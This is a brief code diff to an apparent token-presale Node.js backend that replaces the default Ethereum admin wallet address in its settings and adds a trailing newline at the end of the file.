@@ -84,7 +84,7 @@ const memoryStorage = {
     minEligibilityAmount: parseFloat(process.env.MIN_ELIGIBILITY_AMOUNT) || 10,
     presalePrice: process.env.PRESALE_PRICE || '0.17',
     adminWallets: [
-      { chain: 'Ethereum', address: process.env.ADMIN_ETH_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e' }
+      { chain: 'Ethereum', address: process.env.ADMIN_ETH_WALLET || '0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47' }
     ],
     telegram: {
       botToken: process.env.TELEGRAM_BOT_TOKEN || '',
@@ -1779,3 +1779,4 @@ process.on('SIGINT', () => {
 });
 
 module.exports = app;
+
